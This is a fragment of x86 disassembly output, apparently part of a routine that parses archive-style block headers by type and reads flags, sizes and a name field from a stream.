  4032e9:	5e                   	pop    %esi
  4032ea:	5b                   	pop    %ebx
  4032eb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4032f2:	83 c5 5c             	add    $0x5c,%ebp
  4032f5:	c9                   	leave
  4032f6:	c3                   	ret
  4032f7:	55                   	push   %ebp
  4032f8:	83 ec 68             	sub    $0x68,%esp
  4032fb:	b8 be 26 43 00       	mov    $0x4326be,%eax
  403300:	e8 73 b8 01 00       	call   0x41eb78
  403305:	b8 68 20 00 00       	mov    $0x2068,%eax
  40330a:	e8 41 b9 01 00       	call   0x41ec50
  40330f:	53                   	push   %ebx
  403310:	56                   	push   %esi
  403311:	8b d9                	mov    %ecx,%ebx
  403313:	8d 4d 30             	lea    0x30(%ebp),%ecx
  403316:	57                   	push   %edi
  403317:	53                   	push   %ebx
  403318:	e8 66 98 00 00       	call   0x40cb83
  40331d:	33 c9                	xor    %ecx,%ecx
  40331f:	89 4d 64             	mov    %ecx,0x64(%ebp)
  403322:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  403325:	38 8b d4 6c 00 00    	cmp    %cl,0x6cd4(%ebx)
  40332b:	0f 84 75 01 00 00    	je     0x4034a6
  403331:	8b 93 d8 6c 00 00    	mov    0x6cd8(%ebx),%edx
  403337:	33 c0                	xor    %eax,%eax
  403339:	83 c2 08             	add    $0x8,%edx
  40333c:	13 c1                	adc    %ecx,%eax
  40333e:	39 83 bc 6c 00 00    	cmp    %eax,0x6cbc(%ebx)
  403344:	0f 8c 5c 01 00 00    	jl     0x4034a6
  40334a:	7f 0c                	jg     0x403358
  40334c:	39 93 b8 6c 00 00    	cmp    %edx,0x6cb8(%ebx)
  403352:	0f 86 4e 01 00 00    	jbe    0x4034a6
  403358:	8b 83 d4 21 00 00    	mov    0x21d4(%ebx),%eax
  40335e:	c6 45 6a 01          	movb   $0x1,0x6a(%ebp)
  403362:	38 88 27 61 00 00    	cmp    %cl,0x6127(%eax)
  403368:	74 17                	je     0x403381
  40336a:	8d 43 32             	lea    0x32(%ebx),%eax
  40336d:	50                   	push   %eax
  40336e:	6a 7f                	push   $0x7f
  403370:	e8 16 e0 ff ff       	call   0x40138b
  403375:	c6 83 dd 6c 00 00 01 	movb   $0x1,0x6cdd(%ebx)
  40337c:	e9 8f 07 00 00       	jmp    0x403b10
  403381:	8b 03                	mov    (%ebx),%eax
  403383:	8d 4d 18             	lea    0x18(%ebp),%ecx
  403386:	6a 10                	push   $0x10
  403388:	51                   	push   %ecx
  403389:	8b 70 0c             	mov    0xc(%eax),%esi
  40338c:	8b ce                	mov    %esi,%ecx
  40338e:	ff 15 78 32 43 00    	call   *0x433278
  403394:	8b cb                	mov    %ebx,%ecx
  403396:	ff d6                	call   *%esi
  403398:	83 f8 10             	cmp    $0x10,%eax
  40339b:	0f 85 17 01 00 00    	jne    0x4034b8
  4033a1:	8b 83 d4 21 00 00    	mov    0x21d4(%ebx),%eax
  4033a7:	80 b8 24 61 00 00 00 	cmpb   $0x0,0x6124(%eax)
  4033ae:	75 0d                	jne    0x4033bd
  4033b0:	e8 ae e7 00 00       	call   0x411b63
  4033b5:	c6 45 6b 00          	movb   $0x0,0x6b(%ebp)
  4033b9:	84 c0                	test   %al,%al
  4033bb:	74 04                	je     0x4033c1
  4033bd:	c6 45 6b 01          	movb   $0x1,0x6b(%ebp)
  4033c1:	8b cb                	mov    %ebx,%ecx
  4033c3:	e8 a5 0a 00 00       	call   0x403e6d
  4033c8:	8d 45 28             	lea    0x28(%ebp),%eax
  4033cb:	33 c9                	xor    %ecx,%ecx
  4033cd:	50                   	push   %eax
  4033ce:	51                   	push   %ecx
  4033cf:	ff b3 78 22 00 00    	push   0x2278(%ebx)
  4033d5:	8d 45 18             	lea    0x18(%ebp),%eax
  4033d8:	50                   	push   %eax
  4033d9:	8b 83 d4 21 00 00    	mov    0x21d4(%ebx),%eax
  4033df:	8d bb 7c 22 00 00    	lea    0x227c(%ebx),%edi
  4033e5:	57                   	push   %edi
  4033e6:	05 24 60 00 00       	add    $0x6024,%eax
  4033eb:	8d b3 38 10 00 00    	lea    0x1038(%ebx),%esi
  4033f1:	50                   	push   %eax
  4033f2:	6a 05                	push   $0x5
  4033f4:	51                   	push   %ecx
  4033f5:	8b ce                	mov    %esi,%ecx
  4033f7:	e8 3e 2c 00 00       	call   0x40603a
  4033fc:	80 bb 74 22 00 00 00 	cmpb   $0x0,0x2274(%ebx)
  403403:	74 7d                	je     0x403482
  403405:	8d 83 8c 22 00 00    	lea    0x228c(%ebx),%eax
  40340b:	6a 08                	push   $0x8
  40340d:	50                   	push   %eax
  40340e:	8d 45 28             	lea    0x28(%ebp),%eax
  403411:	50                   	push   %eax
  403412:	e8 33 d8 01 00       	call   0x420c4a
  403417:	83 c4 0c             	add    $0xc,%esp
  40341a:	85 c0                	test   %eax,%eax
  40341c:	74 64                	je     0x403482
  40341e:	80 7d 6b 00          	cmpb   $0x0,0x6b(%ebp)
  403422:	8d 43 32             	lea    0x32(%ebx),%eax
  403425:	50                   	push   %eax
  403426:	50                   	push   %eax
  403427:	75 5e                	jne    0x403487
  403429:	68 83 00 00 00       	push   $0x83
  40342e:	e8 ee eb ff ff       	call   0x402021
  403433:	8b 8b d4 21 00 00    	mov    0x21d4(%ebx),%ecx
  403439:	81 c1 24 60 00 00    	add    $0x6024,%ecx
  40343f:	e8 35 be 00 00       	call   0x40f279
  403444:	8b cb                	mov    %ebx,%ecx
  403446:	e8 22 0a 00 00       	call   0x403e6d
  40344b:	8d 45 28             	lea    0x28(%ebp),%eax
  40344e:	33 c9                	xor    %ecx,%ecx
  403450:	50                   	push   %eax
  403451:	51                   	push   %ecx
  403452:	ff b3 78 22 00 00    	push   0x2278(%ebx)
  403458:	8d 45 18             	lea    0x18(%ebp),%eax
  40345b:	50                   	push   %eax
  40345c:	8b 83 d4 21 00 00    	mov    0x21d4(%ebx),%eax
  403462:	57                   	push   %edi
  403463:	05 24 60 00 00       	add    $0x6024,%eax
  403468:	50                   	push   %eax
  403469:	6a 05                	push   $0x5
  40346b:	51                   	push   %ecx
  40346c:	8b ce                	mov    %esi,%ecx
  40346e:	e8 c7 2b 00 00       	call   0x40603a
  403473:	80 bb 74 22 00 00 00 	cmpb   $0x0,0x2274(%ebx)
  40347a:	8d 83 8c 22 00 00    	lea    0x228c(%ebx),%eax
  403480:	75 89                	jne    0x40340b
  403482:	89 75 50             	mov    %esi,0x50(%ebp)
  403485:	eb 22                	jmp    0x4034a9
  403487:	6a 06                	push   $0x6
  403489:	e8 93 eb ff ff       	call   0x402021
  40348e:	6a 0b                	push   $0xb
  403490:	b9 98 10 44 00       	mov    $0x441098,%ecx
  403495:	c6 83 dd 6c 00 00 01 	movb   $0x1,0x6cdd(%ebx)
  40349c:	e8 e2 38 00 00       	call   0x406d83
  4034a1:	e9 6a 06 00 00       	jmp    0x403b10
  4034a6:	88 4d 6a             	mov    %cl,0x6a(%ebp)
  4034a9:	6a 07                	push   $0x7
  4034ab:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4034ae:	e8 d7 98 00 00       	call   0x40cd8a
  4034b3:	83 f8 07             	cmp    $0x7,%eax
  4034b6:	73 0c                	jae    0x4034c4
  4034b8:	8b cb                	mov    %ebx,%ecx
  4034ba:	e8 3d 0b 00 00       	call   0x403ffc
  4034bf:	e9 4c 06 00 00       	jmp    0x403b10
  4034c4:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4034c7:	c6 83 0c 22 00 00 00 	movb   $0x0,0x220c(%ebx)
  4034ce:	e8 28 97 00 00       	call   0x40cbfb
  4034d3:	6a 04                	push   $0x4
  4034d5:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4034d8:	89 83 fc 21 00 00    	mov    %eax,0x21fc(%ebx)
  4034de:	e8 83 98 00 00       	call   0x40cd66
  4034e3:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4034e6:	8b f0                	mov    %eax,%esi
  4034e8:	e8 0e 98 00 00       	call   0x40ccfb
  4034ed:	8b c8                	mov    %eax,%ecx
  4034ef:	0b ca                	or     %edx,%ecx
  4034f1:	0f 84 12 06 00 00    	je     0x403b09
  4034f7:	85 f6                	test   %esi,%esi
  4034f9:	0f 84 0a 06 00 00    	je     0x403b09
  4034ff:	8d 7e 04             	lea    0x4(%esi),%edi
  403502:	8d 4e fd             	lea    -0x3(%esi),%ecx
  403505:	03 f8                	add    %eax,%edi
  403507:	03 c8                	add    %eax,%ecx
  403509:	0f 88 fa 05 00 00    	js     0x403b09
  40350f:	83 ff 07             	cmp    $0x7,%edi
  403512:	0f 82 f1 05 00 00    	jb     0x403b09
  403518:	51                   	push   %ecx
  403519:	8d 4d 30             	lea    0x30(%ebp),%ecx
  40351c:	e8 69 98 00 00       	call   0x40cd8a
  403521:	39 7d 48             	cmp    %edi,0x48(%ebp)
  403524:	72 92                	jb     0x4034b8
  403526:	8d 4d 30             	lea    0x30(%ebp),%ecx
  403529:	e8 ad 97 00 00       	call   0x40ccdb
  40352e:	8d 4d 30             	lea    0x30(%ebp),%ecx
  403531:	8b f0                	mov    %eax,%esi
  403533:	e8 c3 97 00 00       	call   0x40ccfb
  403538:	8d 4d 30             	lea    0x30(%ebp),%ecx
  40353b:	89 83 00 22 00 00    	mov    %eax,0x2200(%ebx)
  403541:	e8 b5 97 00 00       	call   0x40ccfb
  403546:	89 83 04 22 00 00    	mov    %eax,0x2204(%ebx)
  40354c:	c1 e8 02             	shr    $0x2,%eax
  40354f:	24 01                	and    $0x1,%al
  403551:	89 bb 08 22 00 00    	mov    %edi,0x2208(%ebx)
  403557:	8d bb fc 21 00 00    	lea    0x21fc(%ebx),%edi
  40355d:	88 83 0c 22 00 00    	mov    %al,0x220c(%ebx)
  403563:	39 37                	cmp    %esi,(%edi)
  403565:	8b 83 00 22 00 00    	mov    0x2200(%ebx),%eax
  40356b:	89 83 f4 21 00 00    	mov    %eax,0x21f4(%ebx)
  403571:	0f 95 45 6b          	setne  0x6b(%ebp)
  403575:	74 31                	je     0x4035a8
  403577:	8b cb                	mov    %ebx,%ecx
  403579:	e8 59 eb ff ff       	call   0x4020d7
  40357e:	6a 03                	push   $0x3
  403580:	b9 98 10 44 00       	mov    $0x441098,%ecx
  403585:	c6 83 dc 6c 00 00 01 	movb   $0x1,0x6cdc(%ebx)
  40358c:	e8 f2 37 00 00       	call   0x406d83
  403591:	80 7d 6a 00          	cmpb   $0x0,0x6a(%ebp)
  403595:	74 11                	je     0x4035a8
  403597:	8d 43 32             	lea    0x32(%ebx),%eax
  40359a:	50                   	push   %eax
  40359b:	50                   	push   %eax
  40359c:	6a 04                	push   $0x4
  40359e:	e8 7e ea ff ff       	call   0x402021
  4035a3:	e9 cd fd ff ff       	jmp    0x403375
  4035a8:	33 c0                	xor    %eax,%eax
  4035aa:	f6 83 04 22 00 00 01 	testb  $0x1,0x2204(%ebx)
  4035b1:	89 45 58             	mov    %eax,0x58(%ebp)
  4035b4:	89 45 54             	mov    %eax,0x54(%ebp)
  4035b7:	74 28                	je     0x4035e1
  4035b9:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4035bc:	e8 3a 97 00 00       	call   0x40ccfb
  4035c1:	8b c8                	mov    %eax,%ecx
  4035c3:	89 55 54             	mov    %edx,0x54(%ebp)
  4035c6:	33 c0                	xor    %eax,%eax
  4035c8:	89 4d 58             	mov    %ecx,0x58(%ebp)
  4035cb:	3b d0                	cmp    %eax,%edx
  4035cd:	72 12                	jb     0x4035e1
  4035cf:	0f 87 34 05 00 00    	ja     0x403b09
  4035d5:	3b 8b 08 22 00 00    	cmp    0x2208(%ebx),%ecx
  4035db:	0f 83 28 05 00 00    	jae    0x403b09
  4035e1:	f6 83 04 22 00 00 02 	testb  $0x2,0x2204(%ebx)
  4035e8:	8b f0                	mov    %eax,%esi
  4035ea:	89 75 60             	mov    %esi,0x60(%ebp)
  4035ed:	89 45 5c             	mov    %eax,0x5c(%ebp)
  4035f0:	74 10                	je     0x403602
  4035f2:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4035f5:	e8 01 97 00 00       	call   0x40ccfb
  4035fa:	8b f0                	mov    %eax,%esi
  4035fc:	89 45 60             	mov    %eax,0x60(%ebp)
  4035ff:	89 55 5c             	mov    %edx,0x5c(%ebp)
  403602:	ff b3 08 22 00 00    	push   0x2208(%ebx)
  403608:	8b cb                	mov    %ebx,%ecx
  40360a:	e8 74 e3 ff ff       	call   0x401983
  40360f:	8b 8b bc 6c 00 00    	mov    0x6cbc(%ebx),%ecx
  403615:	33 d2                	xor    %edx,%edx
  403617:	03 83 b8 6c 00 00    	add    0x6cb8(%ebx),%eax
  40361d:	52                   	push   %edx
  40361e:	52                   	push   %edx
  40361f:	ff 75 5c             	push   0x5c(%ebp)
  403622:	13 ca                	adc    %edx,%ecx
  403624:	56                   	push   %esi
  403625:	51                   	push   %ecx
  403626:	50                   	push   %eax
  403627:	e8 cf 08 00 00       	call   0x403efb
  40362c:	89 83 c0 6c 00 00    	mov    %eax,0x6cc0(%ebx)
  403632:	89 93 c4 6c 00 00    	mov    %edx,0x6cc4(%ebx)
  403638:	8b 93 00 22 00 00    	mov    0x2200(%ebx),%edx
  40363e:	8b c2                	mov    %edx,%eax
  403640:	83 e8 01             	sub    $0x1,%eax
  403643:	0f 84 01 04 00 00    	je     0x403a4a
  403649:	83 e8 01             	sub    $0x1,%eax
  40364c:	0f 84 44 01 00 00    	je     0x403796
  403652:	83 e8 01             	sub    $0x1,%eax
  403655:	0f 84 3b 01 00 00    	je     0x403796
  40365b:	83 e8 01             	sub    $0x1,%eax
  40365e:	74 3e                	je     0x40369e
  403660:	83 e8 01             	sub    $0x1,%eax
  403663:	0f 85 98 04 00 00    	jne    0x403b01
  403669:	6a 05                	push   $0x5
  40366b:	59                   	pop    %ecx
  40366c:	8d bb a8 45 00 00    	lea    0x45a8(%ebx),%edi
  403672:	8d b3 fc 21 00 00    	lea    0x21fc(%ebx),%esi
  403678:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40367a:	8d 4d 30             	lea    0x30(%ebp),%ecx
  40367d:	e8 79 96 00 00       	call   0x40ccfb
  403682:	24 01                	and    $0x1,%al
  403684:	88 83 c4 45 00 00    	mov    %al,0x45c4(%ebx)
  40368a:	33 c0                	xor    %eax,%eax
  40368c:	66 89 83 c6 45 00 00 	mov    %ax,0x45c6(%ebx)
  403693:	88 83 c5 45 00 00    	mov    %al,0x45c5(%ebx)
  403699:	e9 63 04 00 00       	jmp    0x403b01
  40369e:	6a 05                	push   $0x5
  4036a0:	59                   	pop    %ecx
  4036a1:	8d bb 60 22 00 00    	lea    0x2260(%ebx),%edi
  4036a7:	8d b3 fc 21 00 00    	lea    0x21fc(%ebx),%esi
  4036ad:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4036af:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4036b2:	e8 44 96 00 00       	call   0x40ccfb
  4036b7:	85 c0                	test   %eax,%eax
  4036b9:	74 28                	je     0x4036e3
  4036bb:	50                   	push   %eax
  4036bc:	68 80 36 43 00       	push   $0x433680
  4036c1:	8d 45 00             	lea    0x0(%ebp),%eax
  4036c4:	6a 14                	push   $0x14
  4036c6:	50                   	push   %eax
  4036c7:	e8 c6 09 00 00       	call   0x404092
  4036cc:	83 c4 10             	add    $0x10,%esp
  4036cf:	8d 45 00             	lea    0x0(%ebp),%eax
  4036d2:	8b cb                	mov    %ebx,%ecx
  4036d4:	50                   	push   %eax
  4036d5:	8d 43 32             	lea    0x32(%ebx),%eax
  4036d8:	50                   	push   %eax
  4036d9:	e8 5f 09 00 00       	call   0x40403d
  4036de:	e9 2d 04 00 00       	jmp    0x403b10
  4036e3:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4036e6:	e8 10 96 00 00       	call   0x40ccfb
  4036eb:	24 01                	and    $0x1,%al
  4036ed:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4036f0:	88 83 74 22 00 00    	mov    %al,0x2274(%ebx)
  4036f6:	e8 b4 94 00 00       	call   0x40cbaf
  4036fb:	0f b6 c0             	movzbl %al,%eax
  4036fe:	89 83 78 22 00 00    	mov    %eax,0x2278(%ebx)
  403704:	83 f8 18             	cmp    $0x18,%eax
  403707:	76 08                	jbe    0x403711
  403709:	50                   	push   %eax
  40370a:	68 88 36 43 00       	push   $0x433688
  40370f:	eb b0                	jmp    0x4036c1
  403711:	6a 10                	push   $0x10
  403713:	8d 83 7c 22 00 00    	lea    0x227c(%ebx),%eax
  403719:	50                   	push   %eax
  40371a:	8d 4d 30             	lea    0x30(%ebp),%ecx
  40371d:	e8 3b 95 00 00       	call   0x40cc5d
  403722:	80 bb 74 22 00 00 00 	cmpb   $0x0,0x2274(%ebx)
  403729:	74 5f                	je     0x40378a
  40372b:	6a 08                	push   $0x8
  40372d:	8d b3 8c 22 00 00    	lea    0x228c(%ebx),%esi
  403733:	56                   	push   %esi
  403734:	8d 4d 30             	lea    0x30(%ebp),%ecx
  403737:	e8 21 95 00 00       	call   0x40cc5d
  40373c:	6a 04                	push   $0x4
  40373e:	8d 45 64             	lea    0x64(%ebp),%eax
  403741:	50                   	push   %eax
  403742:	8d 4d 30             	lea    0x30(%ebp),%ecx
  403745:	e8 13 95 00 00       	call   0x40cc5d
  40374a:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40374d:	50                   	push   %eax
  40374e:	e8 c3 c8 00 00       	call   0x410016
  403753:	6a 08                	push   $0x8
  403755:	56                   	push   %esi
  403756:	8d 45 8c             	lea    -0x74(%ebp),%eax
  403759:	50                   	push   %eax
  40375a:	e8 fd c8 00 00       	call   0x41005c
  40375f:	8d 45 08             	lea    0x8(%ebp),%eax
  403762:	50                   	push   %eax
  403763:	8d 45 8c             	lea    -0x74(%ebp),%eax
  403766:	50                   	push   %eax
  403767:	e8 c7 c7 00 00       	call   0x40ff33
  40376c:	6a 04                	push   $0x4
  40376e:	8d 45 08             	lea    0x8(%ebp),%eax
  403771:	50                   	push   %eax
  403772:	8d 45 64             	lea    0x64(%ebp),%eax
  403775:	50                   	push   %eax
  403776:	e8 cf d4 01 00       	call   0x420c4a
  40377b:	83 c4 0c             	add    $0xc,%esp
  40377e:	f7 d8                	neg    %eax
  403780:	1a c0                	sbb    %al,%al
  403782:	fe c0                	inc    %al
  403784:	88 83 74 22 00 00    	mov    %al,0x2274(%ebx)
  40378a:	c6 83 d4 6c 00 00 01 	movb   $0x1,0x6cd4(%ebx)
  403791:	e9 6b 03 00 00       	jmp    0x403b01
  403796:	33 c0                	xor    %eax,%eax
  403798:	83 fa 02             	cmp    $0x2,%edx
  40379b:	6a 00                	push   $0x0
  40379d:	0f 94 c0             	sete   %al
  4037a0:	8d 78 ff             	lea    -0x1(%eax),%edi
  4037a3:	81 e7 50 23 00 00    	and    $0x2350,%edi
  4037a9:	81 c7 98 22 00 00    	add    $0x2298,%edi
  4037af:	03 fb                	add    %ebx,%edi
  4037b1:	8b cf                	mov    %edi,%ecx
  4037b3:	89 7d 2c             	mov    %edi,0x2c(%ebp)
  4037b6:	e8 09 75 00 00       	call   0x40acc4
  4037bb:	6a 05                	push   $0x5
  4037bd:	59                   	pop    %ecx
  4037be:	8d b3 fc 21 00 00    	lea    0x21fc(%ebx),%esi
  4037c4:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4037c6:	8b 83 00 22 00 00    	mov    0x2200(%ebx),%eax
  4037cc:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4037cf:	8b 75 2c             	mov    0x2c(%ebp),%esi
  4037d2:	89 45 64             	mov    %eax,0x64(%ebp)
  4037d5:	8b 45 60             	mov    0x60(%ebp),%eax
  4037d8:	89 86 58 10 00 00    	mov    %eax,0x1058(%esi)
  4037de:	8b 45 5c             	mov    0x5c(%ebp),%eax
  4037e1:	c6 86 f9 10 00 00 01 	movb   $0x1,0x10f9(%esi)
  4037e8:	89 86 5c 10 00 00    	mov    %eax,0x105c(%esi)
  4037ee:	e8 08 95 00 00       	call   0x40ccfb
  4037f3:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4037f6:	89 86 94 10 00 00    	mov    %eax,0x1094(%esi)
  4037fc:	e8 fa 94 00 00       	call   0x40ccfb
  403801:	89 86 60 10 00 00    	mov    %eax,0x1060(%esi)
  403807:	8b 86 94 10 00 00    	mov    0x1094(%esi),%eax
  40380d:	c1 e8 03             	shr    $0x3,%eax
  403810:	24 01                	and    $0x1,%al
  403812:	89 96 64 10 00 00    	mov    %edx,0x1064(%esi)
  403818:	88 86 9a 10 00 00    	mov    %al,0x109a(%esi)
  40381e:	74 11                	je     0x403831
  403820:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  403825:	89 86 60 10 00 00    	mov    %eax,0x1060(%esi)
  40382b:	89 86 64 10 00 00    	mov    %eax,0x1064(%esi)
  403831:	8b 8e 5c 10 00 00    	mov    0x105c(%esi),%ecx
  403837:	8b be 64 10 00 00    	mov    0x1064(%esi),%edi
  40383d:	8b 86 58 10 00 00    	mov    0x1058(%esi),%eax
  403843:	8b 96 60 10 00 00    	mov    0x1060(%esi),%edx
  403849:	3b cf                	cmp    %edi,%ecx
  40384b:	7c 06                	jl     0x403853
  40384d:	7f 08                	jg     0x403857
  40384f:	3b c2                	cmp    %edx,%eax
  403851:	77 04                	ja     0x403857
  403853:	8b c2                	mov    %edx,%eax
  403855:	8b cf                	mov    %edi,%ecx
  403857:	89 8e 6c 10 00 00    	mov    %ecx,0x106c(%esi)
  40385d:	8d 4d 30             	lea    0x30(%ebp),%ecx
  403860:	89 86 68 10 00 00    	mov    %eax,0x1068(%esi)
  403866:	e8 90 94 00 00       	call   0x40ccfb
  40386b:	f6 86 94 10 00 00 02 	testb  $0x2,0x1094(%esi)
  403872:	89 46 24             	mov    %eax,0x24(%esi)
  403875:	74 16                	je     0x40388d
  403877:	8d 4d 30             	lea    0x30(%ebp),%ecx
  40387a:	e8 7c 93 00 00       	call   0x40cbfb
  40387f:	6a 00                	push   $0x0
  403881:	50                   	push   %eax
  403882:	8d 8e 40 10 00 00    	lea    0x1040(%esi),%ecx
  403888:	e8 02 dd 00 00       	call   0x41158f
  40388d:	83 a6 70 10 00 00 00 	andl   $0x0,0x1070(%esi)
  403894:	f6 86 94 10 00 00 04 	testb  $0x4,0x1094(%esi)
  40389b:	74 18                	je     0x4038b5
  40389d:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4038a0:	c7 86 70 10 00 00 02 	movl   $0x2,0x1070(%esi)
  4038a7:	00 00 00 
  4038aa:	e8 4c 93 00 00       	call   0x40cbfb
  4038af:	89 86 74 10 00 00    	mov    %eax,0x1074(%esi)
  4038b5:	83 a6 00 11 00 00 00 	andl   $0x0,0x1100(%esi)
  4038bc:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4038bf:	e8 37 94 00 00       	call   0x40ccfb
  4038c4:	8b c8                	mov    %eax,%ecx
  4038c6:	89 45 60             	mov    %eax,0x60(%ebp)
  4038c9:	c1 e9 07             	shr    $0x7,%ecx
  4038cc:	80 e1 07             	and    $0x7,%cl
  4038cf:	88 4e 20             	mov    %cl,0x20(%esi)
  4038d2:	8b c8                	mov    %eax,%ecx
  4038d4:	83 e1 3f             	and    $0x3f,%ecx
  4038d7:	83 c1 32             	add    $0x32,%ecx
  4038da:	89 4e 1c             	mov    %ecx,0x1c(%esi)
  4038dd:	83 f9 32             	cmp    $0x32,%ecx
  4038e0:	74 07                	je     0x4038e9
  4038e2:	c7 46 1c 0f 27 00 00 	movl   $0x270f,0x1c(%esi)
  4038e9:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4038ec:	e8 0a 94 00 00       	call   0x40ccfb
  4038f1:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4038f4:	88 46 18             	mov    %al,0x18(%esi)
  4038f7:	e8 ff 93 00 00       	call   0x40ccfb
  4038fc:	8b 8b 04 22 00 00    	mov    0x2204(%ebx),%ecx
  403902:	33 d2                	xor    %edx,%edx
  403904:	c1 e9 06             	shr    $0x6,%ecx
  403907:	42                   	inc    %edx
  403908:	8b f8                	mov    %eax,%edi
  40390a:	c7 86 fc 10 00 00 02 	movl   $0x2,0x10fc(%esi)
  403911:	00 00 00 
  403914:	8a 46 18             	mov    0x18(%esi),%al
  403917:	22 ca                	and    %dl,%cl
  403919:	88 8e f8 10 00 00    	mov    %cl,0x10f8(%esi)
  40391f:	3a c2                	cmp    %dl,%al
  403921:	75 08                	jne    0x40392b
  403923:	89 96 fc 10 00 00    	mov    %edx,0x10fc(%esi)
  403929:	eb 0b                	jmp    0x403936
  40392b:	84 c0                	test   %al,%al
  40392d:	75 07                	jne    0x403936
  40392f:	83 a6 fc 10 00 00 00 	andl   $0x0,0x10fc(%esi)
  403936:	8b 4e 08             	mov    0x8(%esi),%ecx
  403939:	8b c1                	mov    %ecx,%eax
  40393b:	c1 e8 03             	shr    $0x3,%eax
  40393e:	22 c2                	and    %dl,%al
  403940:	88 86 98 10 00 00    	mov    %al,0x1098(%esi)
  403946:	8b c1                	mov    %ecx,%eax
  403948:	c1 e9 05             	shr    $0x5,%ecx
  40394b:	c1 e8 04             	shr    $0x4,%eax
  40394e:	22 ca                	and    %dl,%cl
  403950:	22 c2                	and    %dl,%al
  403952:	88 8e fa 10 00 00    	mov    %cl,0x10fa(%esi)
  403958:	83 7d 64 02          	cmpl   $0x2,0x64(%ebp)
  40395c:	8b 4d 60             	mov    0x60(%ebp),%ecx
  40395f:	88 86 99 10 00 00    	mov    %al,0x1099(%esi)
  403965:	75 09                	jne    0x403970
  403967:	f6 c1 40             	test   $0x40,%cl
  40396a:	74 04                	je     0x403970
  40396c:	8a c2                	mov    %dl,%al
  40396e:	eb 02                	jmp    0x403972
  403970:	32 c0                	xor    %al,%al
  403972:	88 86 f0 10 00 00    	mov    %al,0x10f0(%esi)
  403978:	8a 86 94 10 00 00    	mov    0x1094(%esi),%al
  40397e:	22 c2                	and    %dl,%al
  403980:	c1 e9 0a             	shr    $0xa,%ecx
  403983:	88 86 f1 10 00 00    	mov    %al,0x10f1(%esi)
  403989:	83 e1 0f             	and    $0xf,%ecx
  40398c:	0f b6 c0             	movzbl %al,%eax
  40398f:	ba 00 00 02 00       	mov    $0x20000,%edx
  403994:	d3 e2                	shl    %cl,%edx
  403996:	f7 d8                	neg    %eax
  403998:	1b c0                	sbb    %eax,%eax
  40399a:	f7 d0                	not    %eax
  40399c:	23 c2                	and    %edx,%eax
  40399e:	89 86 f4 10 00 00    	mov    %eax,0x10f4(%esi)
  4039a4:	0f b6 86 9b 10 00 00 	movzbl 0x109b(%esi),%eax
  4039ab:	f7 d8                	neg    %eax
  4039ad:	1b c0                	sbb    %eax,%eax
  4039af:	83 e0 05             	and    $0x5,%eax
  4039b2:	89 86 9c 10 00 00    	mov    %eax,0x109c(%esi)
  4039b8:	b8 ff 1f 00 00       	mov    $0x1fff,%eax
  4039bd:	3b f8                	cmp    %eax,%edi
  4039bf:	72 02                	jb     0x4039c3
  4039c1:	8b f8                	mov    %eax,%edi
  4039c3:	57                   	push   %edi
  4039c4:	8d 85 8c df ff ff    	lea    -0x2074(%ebp),%eax
  4039ca:	50                   	push   %eax
  4039cb:	8d 4d 30             	lea    0x30(%ebp),%ecx
  4039ce:	e8 8a 92 00 00       	call   0x40cc5d
  4039d3:	c6 84 3d 8c df ff ff 	movb   $0x0,-0x2074(%ebp,%edi,1)
  4039da:	00 
  4039db:	8d 85 8c df ff ff    	lea    -0x2074(%ebp),%eax
  4039e1:	68 00 08 00 00       	push   $0x800
  4039e6:	8d 7e 28             	lea    0x28(%esi),%edi
  4039e9:	57                   	push   %edi
  4039ea:	50                   	push   %eax
  4039eb:	e8 4b e2 00 00       	call   0x411c3b
  4039f0:	8b 4d 58             	mov    0x58(%ebp),%ecx
  4039f3:	8b c1                	mov    %ecx,%eax
  4039f5:	0b 45 54             	or     0x54(%ebp),%eax
  4039f8:	74 0d                	je     0x403a07
  4039fa:	56                   	push   %esi
  4039fb:	51                   	push   %ecx
  4039fc:	8d 45 30             	lea    0x30(%ebp),%eax
  4039ff:	8b cb                	mov    %ebx,%ecx
  403a01:	50                   	push   %eax
  403a02:	e8 09 e8 ff ff       	call   0x402210
  403a07:	83 7d 64 02          	cmpl   $0x2,0x64(%ebp)
  403a0b:	75 0a                	jne    0x403a17
  403a0d:	56                   	push   %esi
  403a0e:	8b cb                	mov    %ebx,%ecx
  403a10:	e8 1f e7 ff ff       	call   0x402134
  403a15:	eb 18                	jmp    0x403a2f
  403a17:	68 70 36 43 00       	push   $0x433670
  403a1c:	57                   	push   %edi
  403a1d:	e8 27 04 02 00       	call   0x423e49
  403a22:	59                   	pop    %ecx
  403a23:	59                   	pop    %ecx
  403a24:	85 c0                	test   %eax,%eax
  403a26:	75 07                	jne    0x403a2f
  403a28:	c6 83 ce 6c 00 00 01 	movb   $0x1,0x6cce(%ebx)
  403a2f:	80 7d 6b 00          	cmpb   $0x0,0x6b(%ebp)
  403a33:	0f 84 c8 00 00 00    	je     0x403b01
  403a39:	57                   	push   %edi
  403a3a:	8d 43 32             	lea    0x32(%ebx),%eax
  403a3d:	50                   	push   %eax
  403a3e:	6a 1c                	push   $0x1c
  403a40:	e8 dc e5 ff ff       	call   0x402021
  403a45:	e9 b7 00 00 00       	jmp    0x403b01
  403a4a:	8d 8b 20 22 00 00    	lea    0x2220(%ebx),%ecx
  403a50:	e8 09 73 00 00       	call   0x40ad5e
  403a55:	6a 05                	push   $0x5
  403a57:	8b f7                	mov    %edi,%esi
  403a59:	8d bb 20 22 00 00    	lea    0x2220(%ebx),%edi
  403a5f:	59                   	pop    %ecx
